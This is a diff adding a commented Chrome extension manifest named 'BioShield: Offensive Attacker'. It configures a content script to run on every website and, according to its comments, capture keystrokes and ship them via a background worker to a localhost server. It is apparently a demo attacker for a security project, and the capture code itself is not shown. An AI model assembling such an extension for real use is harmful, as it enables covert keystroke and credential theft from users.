@@ -1,0 +1,29 @@
+{
+  "manifest_version": 3,
+  // This is the mandatory Google standard. It ensures the extension is secure and fast.
+
+  "name": "BioShield: Offensive Attacker",
+  // The name that appears in your Chrome Extension list.
+
+  "version": "1.0",
+
+  "permissions": ["scripting", "tabs"],
+  // "scripting" allows the attacker.js to run; "tabs" lets it see different websites.
+
+  "host_permissions": ["http://localhost:3000/*"],
+  // This is CRITICAL. It gives the browser permission to "talk" to your server.js.
+
+  "background": {
+    "service_worker": "background.js"
+    // This starts the background "Brain" that ships data to the server.
+  },
+
+  "content_scripts": [
+    {
+      "matches": ["<all_urls>"],
+      // This ensures the "Attacker" is active on EVERY website you visit.
+      "js": ["attacker.js"]
+      // This is the file that actually captures the keys.
+    }
+  ]
+}
